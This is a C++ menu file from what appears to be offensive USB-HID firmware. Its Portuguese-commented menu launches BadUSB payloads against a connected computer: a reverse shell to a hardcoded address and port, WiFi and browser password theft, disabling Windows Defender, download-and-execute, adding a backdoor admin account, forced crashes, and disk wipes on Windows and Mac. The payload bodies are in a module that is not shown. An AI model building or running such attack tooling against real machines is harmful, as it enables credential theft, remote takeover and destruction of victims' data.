/**
 * @file UsbMenu.cpp
 * @brief Implementação do Menu de Ataques USB
 * @author Lele Origin Team
 * @version 1.0
 *
 * Menu com:
 * - BadUSB / Ducky Scripts
 * - Payloads pré-definidos
 * - HID Injection
 * - Keystroke customizado
 */

#include "UsbMenu.h"
#include "core/display.h"
#include "core/sd_functions.h"
#include "core/utils.h"
#include "modules/usb/usb_attacks.h"
#include <globals.h>

#define DEFAULT_IP "192.168.1.100"


void UsbMenu::optionsMenu() {
    options.clear();

    // Inicialização
    options.push_back({"Inicializar USB", [=]() { usb_attacks_init(); }});

    // BadUSB / Ducky
    options.push_back({"--- BADUSB ---", [=]() {}});

    options.push_back({"Carregar Script", [=]() {
                           String filepath = loopSD(SD, true, "txt");
                           if (filepath != "") { usb_run_ducky_script(filepath.c_str()); }
                       }});

    options.push_back({"Teclado USB", [=]() { displayInfo("Conecte USB\nao alvo", true); }});

    // Payloads Pré-definidos
    options.push_back({"--- PAYLOADS ---", [=]() {}});

    options.push_back({"Reverse Shell", [=]() {
                           displayWarning("Reverse Shell\n\nConfigura shell\nreverso no alvo", true);
                           delay(1000);
                           usb_payload_reverse_shell("192.168.1.100", 4444);
                       }});

    options.push_back({"WiFi Stealer", [=]() {
                           displayWarning("WiFi Stealer\n\nExporta senhas\nWiFi do Windows", true);
                           delay(1000);
                           usb_payload_wifi_stealer();
                       }});

    options.push_back({"Browser Creds", [=]() {
                           displayWarning("Browser Creds\n\nExtrai senhas\ndos navegadores", true);
                           delay(1000);
                           usb_payload_browser_creds();
                       }});

    options.push_back({"Disable Defender", [=]() {
                           displayWarning("Disable Defender\n\nDesativa Windows\nDefender (UAC)", true);
                           delay(1000);
                           usb_payload_disable_defender();
                       }});

    // --- PAYLOADS AVANÇADOS (Expandido) ---
    options.push_back({"--- AVANCADOS ---", [=]() {}});

    options.push_back({"Download & Exec", [=]() {
                           displayWarning("Download & Exec\n\nBaixa e roda .exe\nda internet", true);
                           delay(1000);
                           usb_run_payload(PAYLOAD_DOWNLOAD_EXEC);
                       }});

    options.push_back({"Add Admin User", [=]() {
                           displayWarning("Add Admin\n\nCria user Admin\nbackdoor", true);
                           delay(1000);
                           usb_run_payload(PAYLOAD_ADD_ADMIN);
                       }});

    options.push_back({"Fake Update", [=]() {
                           displayInfo("Fake Update...", true);
                           usb_run_payload(PAYLOAD_FAKE_UPDATE);
                       }});

    options.push_back({"Wallpaper Hack", [=]() {
                           displayInfo("Changing Wall...", true);
                           usb_run_payload(PAYLOAD_WALLPAPER);
                       }});

    options.push_back({"TTS Speak", [=]() {
                           displayInfo("Speaking...", true);
                           usb_run_payload(PAYLOAD_SPEAK);
                       }});

    options.push_back({"Info to Notepad", [=]() {
                           displayInfo("Dumping Info...", true);
                           usb_run_payload(PAYLOAD_INFO_TO_NOTEPAD);
                       }});

    options.push_back({"Forced BSOD", [=]() {
                           displayWarning("ATENCAO: BSOD\n\nIsso vai crashar\no PC alvo!", true);
                           delay(2000);
                           usb_run_payload(PAYLOAD_BSOD);
                       }});

    options.push_back({"Disk Wipe Windows", [=]() {
                           displayWarning("DISK WIPE WINDOWS\n\nVai apagar TUDO!\nDisk 0", true);
                           delay(2000);
                           usb_run_payload(PAYLOAD_DISK_WIPE_WIN);
                       }});

    options.push_back({"Disk Wipe Mac", [=]() {
                           displayWarning("DISK WIPE MAC\n\nVai brickar o Mac!\n/dev/rdisk0", true);
                           delay(2000);
                           usb_run_payload(PAYLOAD_DISK_WIPE_MAC);
                       }});

    options.push_back({"Reverse Shell to Pi", [=]() {
                           displayWarning("Reverse Shell to Pi\n\nConnects to Raspberry Pi\nshell.ps1", true);
                           delay(1000);
                           usb_payload_reverse_shell_pi(DEFAULT_IP);
                       }});

    // Ataques Rápidos
    options.push_back({"--- RAPIDOS ---", [=]() {}});

    options.push_back({"Abrir CMD", [=]() {
                           usb_send_keys("", 0); // WIN+R, cmd, ENTER
                           displayInfo("Abrindo CMD...", true);
                       }});

    options.push_back({"Abrir PowerShell", [=]() { displayInfo("Abrindo PS...", true); }});

    options.push_back({"Rickroll", [=]() {
                           displayInfo("Never gonna\ngive you up!", true);
                           // Abre URL do rickroll
                       }});

    options.push_back({"Parar Ataque", [=]() { usb_stop_attack(); }});

    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "USB Attacks");
}

void UsbMenu::drawIconImg() {
    drawImg(
        *leleConfig.themeFS(), leleConfig.getThemeItemImg(leleConfig.theme.paths.usb), 0, imgCenterY, true
    );
}

void UsbMenu::drawIcon(float scale) {
    clearIconArea();

    // Dimensões do USB
    int bodyW = scale * 24;
    int bodyH = scale * 40;
    int connW = scale * 16;
    int connH = scale * 12;
    int metalW = scale * 8;
    int metalH = scale * 6;

    int startX = iconCenterX - bodyW / 2;
    int startY = iconCenterY - bodyH / 2 + connH / 2;

    // Corpo principal do USB (retângulo arredondado)
    tft.fillRoundRect(startX, startY, bodyW, bodyH, 4, leleConfig.priColor);

    // Conector metálico na parte superior
    int connX = iconCenterX - connW / 2;
    int connY = startY - connH;
    tft.fillRect(connX, connY, connW, connH, TFT_SILVER);

    // Detalhes metálicos internos do conector
    tft.fillRect(connX + 2, connY + 2, metalW, metalH - 2, TFT_DARKGREY);
    tft.fillRect(connX + connW - metalW - 2, connY + 2, metalW, metalH - 2, TFT_DARKGREY);

    // Logo USB no corpo (símbolo tridente)
    int logoX = iconCenterX;
    int logoY = startY + bodyH / 2;

    // Linha central
    tft.drawLine(logoX, logoY - scale * 10, logoX, logoY + scale * 8, leleConfig.bgColor);

    // Seta superior
    tft.fillCircle(logoX, logoY - scale * 10, scale * 3, leleConfig.bgColor);

    // Ramificações
    tft.drawLine(logoX, logoY, logoX - scale * 6, logoY - scale * 6, leleConfig.bgColor);
    tft.drawLine(logoX, logoY, logoX + scale * 6, logoY - scale * 6, leleConfig.bgColor);

    // Terminais
    tft.fillCircle(logoX - scale * 6, logoY - scale * 6, scale * 2, leleConfig.bgColor);
    tft.fillRect(logoX + scale * 4, logoY - scale * 8, scale * 4, scale * 4, leleConfig.bgColor);

    // Base (quadrado)
    tft.fillRect(logoX - scale * 3, logoY + scale * 5, scale * 6, scale * 4, leleConfig.bgColor);
}
